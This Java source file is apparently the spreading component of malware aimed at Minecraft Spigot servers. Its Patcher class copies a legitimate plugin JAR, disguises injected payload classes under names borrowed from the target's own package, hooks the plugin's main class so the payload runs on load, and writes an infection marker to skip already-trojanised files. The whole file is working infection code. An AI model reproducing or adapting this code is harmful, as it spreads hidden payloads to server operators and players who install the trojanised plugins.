package com.tmquan2508.exploit.spread;

import com.tmquan2508.exploit.Exploit;
import java.io.IOException;
import java.nio.file.*;
import java.util.Map;
import java.util.logging.Level;

public final class Patcher {

    public static boolean patchFile(String origJarPath, String outJarPath, Class<?> sourceClassToInject) {
        Exploit.sender.sendDebug(Level.INFO, String.format("[Patcher] Request: '%s' -> '%s'", origJarPath, outJarPath));
        Path input = Paths.get(origJarPath);
        if (PatchUtils.isAlreadyPatched(input)) {
            Exploit.sender.sendDebug(Level.INFO, "[Patcher] Target is already patched. Skipping.");
            return false;
        }

        try {
            return performPatching(origJarPath, outJarPath, sourceClassToInject);
        } catch (Throwable e) {
            Exploit.sender.sendDebug(Level.SEVERE, "[CRITICAL] A critical error occurred during patching. Rolling back.");
            Exploit.sender.sendDebug(Level.SEVERE, PatchUtils.stackTrace(e));
            try { Files.deleteIfExists(Paths.get(outJarPath)); } catch (IOException ignored) {}
            return false;
        }
    }

    private static boolean performPatching(String orig, String out, Class<?> sourceClassToInject) throws Throwable {
        Path input = Paths.get(orig);
        Path output = Paths.get(out);

        // Step 1
        CamouflageUtils.CamouflagePlan plan = CamouflageUtils.generateCamouflagePlan(input.toFile());
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Generated CAMOUFLAGE plan.");
        Exploit.sender.sendDebug(Level.INFO, "  |-> Target Package: " + plan.packageName());
        Exploit.sender.sendDebug(Level.INFO, "  |-> New Base Name: " + plan.namePrefix());

        // Step 2
        Files.copy(input, output, StandardCopyOption.REPLACE_EXISTING);
        PatchUtils.JavaVersion dominantVersion = PatchUtils.findDominantVersion(output);
        Exploit.sender.sendDebug(Level.INFO, String.format(
            "[+] Patcher: Dominant Java version in target: Major %d, Minor %d",
            dominantVersion.major(),
            dominantVersion.minor()
        ));

        // Step 3
        Map<String, Object> pluginYAML = PatchUtils.readPluginYAML(output.toAbsolutePath().toString());
        if (pluginYAML == null) {
            Exploit.sender.sendDebug(Level.WARNING, "[!] Patcher: Not a valid Spigot plugin. Cleaning up.");
            Files.delete(output);
            return false;
        }
        String mainClass = (String) pluginYAML.get("main");
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Found plugin main class: " + mainClass);

        // Step 4
        PayloadInjector.Result injectionResult = PayloadInjector.inject(sourceClassToInject, plan, dominantVersion);
        if (injectionResult.finalPayloadFQN() == null) {
            throw new IllegalStateException("Failed to determine the final FQN for the main payload class.");
        }

        // Step 5
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Writing changes to JAR file...");
        try (FileSystem outStream = FileSystems.newFileSystem(output, (ClassLoader) null)) {
            for (Map.Entry<String, byte[]> entry : injectionResult.allPayloadBytecode().entrySet()) {
                String classPath = entry.getKey().replace('.', '/') + ".class";
                Path targetPath = outStream.getPath(classPath);
                if (targetPath.getParent() != null) Files.createDirectories(targetPath.getParent());
                Files.write(targetPath, entry.getValue());
            }
            MainClassPatcher.hook(outStream, mainClass, injectionResult.finalPayloadFQN());
        }

        // Step 6
        PatchUtils.setInfectionMarkerOnTarget(output);

        // Step 7
        Exploit.sender.sendDebug(Level.INFO, "[+] Patcher: Summary of file changes:");
        String mainClassPath = mainClass.replace('.', '/') + ".class";
        Exploit.sender.sendDebug(Level.INFO, String.format("  |-> MODIFIED: %s", mainClassPath));
        
        for (String fqn : injectionResult.allPayloadBytecode().keySet()) {
            String addedClassPath = fqn.replace('.', '/') + ".class";
            Exploit.sender.sendDebug(Level.INFO, String.format("  |-> ADDED:    %s", addedClassPath));
        }

        Exploit.sender.sendDebug(Level.INFO, String.format("[SUCCESS] Successfully patched '%s'.", output.getFileName()));
        return true;
    }
}